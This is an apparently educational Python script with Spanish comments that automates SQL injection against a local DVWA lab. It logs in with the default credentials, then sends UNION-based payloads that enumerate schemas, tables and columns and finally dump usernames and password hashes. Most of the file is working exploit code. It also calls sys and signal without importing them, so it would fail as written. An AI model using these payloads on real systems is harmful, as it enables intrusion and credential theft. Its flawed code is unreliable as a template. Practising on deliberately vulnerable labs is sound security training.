# SQLi Exploiter simple
# Tested en DVWA

# docker pull vulnerables/web-dvwa
# docker run --rm -p 8080:80 --name dvwa vulnerables/web-dvwa

## pip install beautifulsoup4

import requests
# BeautifulSoup es una biblioteca de Python que sirve para parsear (analizar) documentos HTML y XML de manera sencilla y estructurada. 
from bs4 import BeautifulSoup
import platform
from colorama import init, Fore, Style

# Inicializa colorama (necesario en Windows)
if platform.system() == "Windows":
    init()

# Datos de login en DVWA (por defecto)
LOGIN_URL = "http://localhost:8080/login.php"
TARGET_URL = "http://localhost:8080/vulnerabilities/sqli/?id="
USERNAME = "admin"
PASSWORD = "password"

# 1. sig (signal):
# Es un número entero que representa la señal recibida.
# Ejemplo: SIGINT es 2, SIGTERM es 15, etc.
# 2. frame (stack frame):
# Es un objeto que representa el estado del programa (línea de ejecución, variables locales, etc.) en el momento en que se recibió la señal.
# Útil si quieres hacer debug o registrar dónde estaba el programa cuando se interrumpió.
def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(0)

def login():
    # Se crea una sesión persistente para manejar cookies automáticamente
    session = requests.Session()

    # Obtener el token CSRF de login
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, 'html.parser')  # Parsear el HTML de respuesta
    token_input = soup.find("input", {"name": "user_token"})  # Buscar el token CSRF

    if not token_input:
        print("[-] No se encontró el token CSRF")
        return None

    token = token_input.get("value")  # Extraer el valor del token

    # Enviar login con usuario, contraseña y token CSRF
    data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }

    response = session.post(LOGIN_URL, data=data)

    if "Login failed" in response.text:
        print(Fore.RED + "[-] Falló el login." + Style.RESET_ALL)
        return None

    print(Fore.GREEN + "[+] Sesión iniciada correctamente." + Style.RESET_ALL)
    return session

def sql_injection(session):
    payloads = [
        # Muestra todos los usuarios
        "' OR 1=1-- -",
        # Nombre de base de datos
        "' UNION SELECT 1,database()-- -",
        # Usuario de la base de datos
        "' UNION SELECT 1,user()-- -",
        # Listar todas las bases de datos
        "' UNION SELECT 1, GROUP_CONCAT(schema_name) FROM information_schema.schemata-- -",
        # Listar todas las tablas de la base de datos en uso
        "' UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='dvwa'-- -",
        # Lista todas las columnas de la tabla users
        "' UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users'-- -",
        # Listamos solo las columnas user y password (0x3a es ":" en hexadecimal)
        "' UNION SELECT 1, GROUP_CONCAT(user,0x3a,password) FROM users-- -"
    ]

    for payload in payloads:
        print(Fore.YELLOW + f"\n[>] Payload: {payload}" + Style.RESET_ALL)

        params = {
            "id": payload,
            "Submit": "Submit"
        }

        # Realiza la petición GET autenticada
        response = session.get(TARGET_URL, params=params)

        # Intenta extraer datos del HTML de respuesta
        resultados = extract_data(response.text)
        if resultados:
            for r in resultados:
                print(Fore.GREEN + "[+] Resultado:" + Style.RESET_ALL)
                print(Fore.CYAN + r + Style.RESET_ALL)
        else:
            print(Fore.RED + "[-] No se extrajo información relevante." + Style.RESET_ALL)

def extract_data(html):
    # Parsear HTML con BeautifulSoup
    soup = BeautifulSoup(html, "html.parser")

    # Busca todos los bloques <pre>, donde usualmente DVWA muestra resultados
    data = soup.find_all("pre")
    resultados = []

    for pre in data:
        # Extrae el texto limpio del bloque <pre>
        contenido = pre.get_text(separator="\n").strip()
        if contenido:
            # Guarda los contenidos relevantes
            resultados.append(contenido)

    return resultados

if __name__ == "__main__":
    signal.signal(signal.SIGINT, def_handler)
    # Iniciar sesión en DVWA
    session = login()
    if session:
        # Ejecutar SQLi con la sesión activa
        sql_injection(session)
